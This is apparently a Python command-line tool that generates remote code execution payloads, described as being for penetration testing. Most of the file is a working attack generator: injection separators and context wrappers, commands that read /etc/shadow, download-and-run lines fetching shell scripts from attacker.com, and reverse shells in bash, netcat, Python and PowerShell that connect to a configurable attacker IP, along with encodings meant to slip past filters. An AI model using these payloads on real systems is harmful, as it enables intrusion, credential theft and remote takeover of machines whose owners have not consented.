import argparse
import urllib.parse
import base64
import random
import string
import codecs
import logging
import sys
from typing import Dict, List, Set, Callable, Any, Iterator
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("rce_generator.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class RCEPayloadGenerator:
    def __init__(self, attacker_ip: str = "192.168.1.100", attacker_domain: str = "attacker.com"):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        self.setup_components()
        
    def setup_components(self):
        """Initialize all payload components"""
        # Context-specific wrappers for different injection points
        self.contexts = {
            "html": {"prefix": "", "suffix": ""},
            "attribute": {"prefix": "\"", "suffix": "\""},
            "javascript": {"prefix": "';", "suffix": ";//"},
            "sql": {"prefix": "';", "suffix": "-- "},
            "php": {"prefix": "<?php ", "suffix": "?>"},
            "unix_shell": {"prefix": "", "suffix": ""},
            "windows_cmd": {"prefix": "", "suffix": ""},
            "powershell": {"prefix": "", "suffix": ""},
        }

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "php": [".", ";"],
            "javascript": [";", ","],
        }

        # Common payloads by environment and category
        self.payload_categories = {
            "basic_enum": {
                "unix": ["id", "whoami", "uname -a", "pwd", "ls -la", "ps aux"],
                "windows": ["whoami", "ver", "dir", "tasklist", "ipconfig"],
            },
            "file_operations": {
                "unix": [
                    "cat /etc/passwd", "cat /etc/shadow", 
                    "head -n 10 /etc/passwd", "tail -f /var/log/syslog",
                    "find / -name '*.conf' -type f 2>/dev/null"
                ],
                "windows": [
                    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "dir C:\\Windows\\System32\\drivers\\etc",
                    "dir C:\\Users"
                ],
            },
            "network_operations": {
                "unix": ["ifconfig", "netstat -tulpn", "arp -a", "ping -c 4 127.0.0.1"],
                "windows": ["ipconfig /all", "netstat -ano", "arp -a", "ping -n 4 127.0.0.1"],
            },
            "code_execution": {
                "php": [
                    "system('whoami')", "exec('whoami')", "shell_exec('whoami')",
                    "passthru('whoami')", "eval('system(\\\"whoami\\\")')"
                ],
                "python": [
                    "os.system('whoami')", "subprocess.call(['whoami'], shell=True)",
                    "exec('import os; os.system(\\\"whoami\\\")')"
                ],
                "java": [
                    "Runtime.getRuntime().exec(\"whoami\")",
                    "new ProcessBuilder(\"whoami\").start()"
                ],
                "javascript": [
                    "require('child_process').exec('whoami')",
                    "eval(\"require('child_process').exec('whoami')\")"
                ],
            },
            "download_execute": {
                "unix": [
                    "curl http://{attacker_domain}/shell.sh | sh",
                    "wget http://{attacker_domain}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
                    "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://{attacker_domain}/shell.py').read())\""
                ],
                "windows": [
                    "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_domain}/shell.ps1')\"",
                    "certutil -urlcache -f http://{attacker_domain}/shell.exe shell.exe && shell.exe"
                ],
            },
            "reverse_shells": {
                "unix": [
                    "bash -i >& /dev/tcp/{attacker_ip}/443 0>&1",
                    "nc -e /bin/sh {attacker_ip} 443",
                    "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{attacker_ip}\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'"
                ],
                "windows": [
                    "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()\""
                ],
            },
        }

        # Encoding and obfuscation techniques
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "rot13": lambda x: codecs.encode(x, 'rot13'),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            "insert_special_chars": lambda x: self.insert_special_chars(x, 0.1),
        }

    def insert_special_chars(self, s: str, frequency: float = 0.1) -> str:
        """Insert special characters randomly"""
        special_chars = ['%00', '%0a', '%0d', '%09', '%20', '%0b', '%0c']
        result = []
        for char in s:
            if random.random() < frequency:
                result.append(random.choice(special_chars))
            result.append(char)
        return ''.join(result)

    def generate_payloads(self, selected_contexts: List[str] = None, 
                         selected_categories: List[str] = None,
                         selected_encodings: List[str] = None,
                         selected_environments: List[str] = None) -> Iterator[str]:
        """
        Generate RCE payloads based on selected options
        
        Args:
            selected_contexts: List of contexts to include (default: all)
            selected_categories: List of categories to include (default: all)
            selected_encodings: List of encoding methods to apply (default: all)
            selected_environments: List of environments to include (default: all)
            
        Yields:
            Generated payload strings
        """
        generated_payloads: Set[str] = set()
        
        # Use all if none specified
        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
        environments = selected_environments if selected_environments else ["unix", "windows", "php", "python", "java", "javascript"]
        
        logger.info(f"Generating payloads for contexts: {contexts}, categories: {categories}, "
                   f"encodings: {encodings}, environments: {environments}")
        
        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning(f"Unknown context: {context_name}")
                continue
                
            context = self.contexts[context_name]
            
            for category_name in categories:
                if category_name not in self.payload_categories:
                    logger.warning(f"Unknown category: {category_name}")
                    continue
                    
                category = self.payload_categories[category_name]
                
                for env in environments:
                    if env not in category:
                        continue
                        
                    for payload in category[env]:
                        # Replace placeholders
                        formatted_payload = payload.format(
                            attacker_ip=self.attacker_ip,
                            attacker_domain=self.attacker_domain
                        )
                        
                        # Add environment-specific separators
                        if env in self.separators:
                            for sep in self.separators[env]:
                                # Basic payload with separator
                                full_payload = f"{sep}{formatted_payload}"
                                
                                # Apply selected encoding methods
                                for enc_name in encodings:
                                    if enc_name not in self.encoding_methods:
                                        logger.warning(f"Unknown encoding: {enc_name}")
                                        continue
                                        
                                    try:
                                        enc_func = self.encoding_methods[enc_name]
                                        encoded_payload = enc_func(full_payload)
                                        
                                        # Wrap in context
                                        wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                                        
                                        # Add to results if not already present
                                        if wrapped_payload not in generated_payloads:
                                            generated_payloads.add(wrapped_payload)
                                            yield wrapped_payload
                                    except Exception as e:
                                        logger.error(f"Error encoding payload: {e}")
                                        continue
                        
                        # Also add payload without separator
                        for enc_name in encodings:
                            if enc_name not in self.encoding_methods:
                                continue
                                
                            try:
                                enc_func = self.encoding_methods[enc_name]
                                encoded_payload = enc_func(formatted_payload)
                                
                                # Wrap in context
                                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                                
                                # Add to results if not already present
                                if wrapped_payload not in generated_payloads:
                                    generated_payloads.add(wrapped_payload)
                                    yield wrapped_payload
                            except Exception as e:
                                logger.error(f"Error encoding payload: {e}")
                                continue

    def save_payloads_to_file(self, file_path: str, max_payloads: int = None, **kwargs) -> int:
        """
        Generate payloads and save them to a file
        
        Args:
            file_path: Path to the output file
            max_payloads: Maximum number of payloads to generate (None for unlimited)
            **kwargs: Arguments to pass to generate_payloads
            
        Returns:
            Number of payloads generated
        """
        count = 0
        try:
            with open(file_path, "w") as file:
                for payload in self.generate_payloads(**kwargs):
                    file.write(payload + "\n")
                    count += 1
                    if max_payloads and count >= max_payloads:
                        break
                        
            logger.info(f"Successfully generated {count} payloads to {file_path}")
        except Exception as e:
            logger.error(f"Error writing to file {file_path}: {e}")
            
        return count

def main():
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("-o", "--output", default="rce_payloads.txt", 
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate (default: all)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: all)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = RCEPayloadGenerator(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain
    )
    
    # Generate and save payloads
    count = generator.save_payloads_to_file(
        file_path=args.output,
        max_payloads=args.max_payloads,
        selected_contexts=args.contexts,
        selected_categories=args.categories,
        selected_encodings=args.encodings,
        selected_environments=args.environments
    )
    
    print(f"Generated {count} payloads to {args.output}")

if __name__ == "__main__":
    main()